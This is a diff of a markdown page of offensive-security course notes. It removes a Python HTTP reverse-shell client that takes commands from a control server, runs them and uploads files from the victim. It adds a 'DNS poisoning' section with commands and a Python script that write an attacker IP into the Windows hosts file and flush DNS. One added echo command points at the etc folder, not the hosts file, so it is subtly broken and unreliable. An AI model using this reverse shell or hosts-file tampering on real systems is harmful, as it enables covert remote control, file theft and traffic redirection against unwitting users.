@@ -1,16 +1,16 @@
 ---
-title: Tunning the connection attempts
+title: DNS poisoning
 author: amandaguglieri
 draft: false
 TableOfContents: true
 tags:
   - python
   - python pentesting
-  - scripting
-  - reverse shell
+  - techniques
+  - DNS poisoning
 ---
 
-# Tunning the connection attempts
+# DNS poisoning
 
 From course: [Python For Offensive PenTest: A Complete Practical Course](https://www.udemy.com/course/python-for-offensive-security-practical-course/).
 
@@ -46,58 +46,35 @@ From course: [Python For Offensive PenTest: A Complete Practical Course](https:/
 		- [Weak service file permission](privilege-escalation.md).
 
 
-## Client side
+**1.** Add a new line to hosts file in windows with attacker IP and an url
 
-We put our previous [http shell](coding-an-http-reverse-shell.md) in a function called connect.
+```cmd
+echo 10.10.120.12 google.com >> c:\Windows\System32\drivers\etc
+```
+
+**2.** Flush the DNS cache to make sure that we will use the updated record
+
+```cmd
+ipconfig /flushdns
+```
+
+Now traffic will be redirected to the attacker machine.
+
+
+## Python script for DNS poisoning
+
 
 ```python
-import requests
-import os
 import subprocess
-import time
+import os
 
-import random # Needed to generate random 
+os.chdir("C:\Windows\System32\drivers\etc")
 
+command = "echo 10.10.10.100 www.google.com >> hosts"
 
-def connect(): # we put our previous http shell in a function called connect
+CMD = subprocess.Popen(command, shell=True, stdout=subprocess.PIPE, stderr=subprocess.PIPE, stdin=subprocess.PIPE)
 
-    while True:
+command = "ipconfig /flushdns"
 
-        req = requests.get('http://127.0.0.1:8080')
-        command = req.text
-
-        if 'terminate' in command:
-            return 1 # if we got terminate order, then we exit connect function and return a value of 1, this value will be used to end up the whole script
-
-
-        elif 'grab' in command:
-            grab, path = command.split("*")
-            if os.path.exists(path):
-                url = "http://127.0.0.1:8080/store"
-                files = {'file': open(path, 'rb')}
-                r = requests.post(url, files=files)
-            else:
-                post_response = requests.post(url='http://127.0.0.1:8080', data='[-] Not able to find the file!'.encode())
-        else:
-            CMD = subprocess.Popen(command, shell=True, stdout=subprocess.PIPE, stderr=subprocess.PIPE)
-            post_response = requests.post(url='http://127.0.0.1:8080', data=CMD.stdout.read())
-            post_response = requests.post(url='http://127.0.0.1:8080', data=CMD.stderr.read())
-    time.sleep(3)
-
-
-# Here we start our infinite loop, we try to connect to our kali server, if we got an exception (connection error)
-# then we will sleep for a random time between 1 and 10 seconds and we will pass that exception and go back to the 
-# infinite loop once again untill we got a sucessful connection. 
-
-
-while True:
-    try:
-        if connect() == 1:
-            break
-    except:
-        sleep_for = random.randrange(1, 10)#Sleep for a random time between 1-10 seconds
-        time.sleep(int(sleep_for))
-        #time.sleep( sleep_for * 60 )      #Sleep for a random time between 1-10 minutes
-        pass
-
+CMD = subprocess.Popen(command, shell=True, stdout=subprocess.PIPE, stderr=subprocess.PIPE, stdin=subprocess.PIPE)
 ```
